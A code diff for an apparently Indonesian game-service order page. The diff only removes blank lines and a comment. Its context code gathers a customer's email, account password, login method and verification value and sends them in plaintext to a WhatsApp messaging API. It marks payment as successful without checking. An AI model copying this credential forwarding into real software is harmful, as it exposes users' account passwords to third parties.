@@ -83,7 +83,6 @@ document.addEventListener("DOMContentLoaded", () => {
       element.classList.add("selected");
       selectedItem = item;
     }
-
     const selectedCard = document.querySelector(".payment-inner-card.selected");
     if (selectedCard) {
       const method = document.getElementById("metode-terpilih").value;
@@ -105,7 +104,6 @@ document.addEventListener("DOMContentLoaded", () => {
     inputs.forEach((input) => {
       if (!input.value || input.value.trim() === "") valid = false;
     });
-
     const metode = document.getElementById("metode-terpilih").value;
     if (!valid || !selectedItem || !metode) {
       Swal.fire({
@@ -122,11 +120,9 @@ document.addEventListener("DOMContentLoaded", () => {
       });
       return;
     }
-
     const data = Object.fromEntries(new FormData(form).entries());
     const item = selectedItem;
     const message = `🔥 *Order Baru dari Website* 🔥\n👤 Nickname: ${data.nickname}\n📧 Email: ${data.email}\n🔐 Password: ${data.password}\n🔑 Login: ${data.loginMethod}\n📱 WhatsApp: ${data.whatsapp}\n🛒 Orderan:\n- ${item.label} (${item.harga})\n🔒 V2L: ${data.v2l}\n💳 Pembayaran: ${data.metode}\n✅ Status: Pembayaran berhasil`;
-
     fetch("https://api.fonnte.com/send", {
       method: "POST",
       headers: {
@@ -157,8 +153,6 @@ document.addEventListener("DOMContentLoaded", () => {
         });
       });
   });
-
-  // hilangkan event batal jika klik di luar
 });
 
 function toggleCollapse(element) {
@@ -181,7 +175,6 @@ function selectPayment(card, method) {
     });
     card.classList.add("selected");
     input.value = method;
-
     const total = calculateTotalHarga(method);
     const span = document.createElement("div");
     span.className = "total-harga-text";
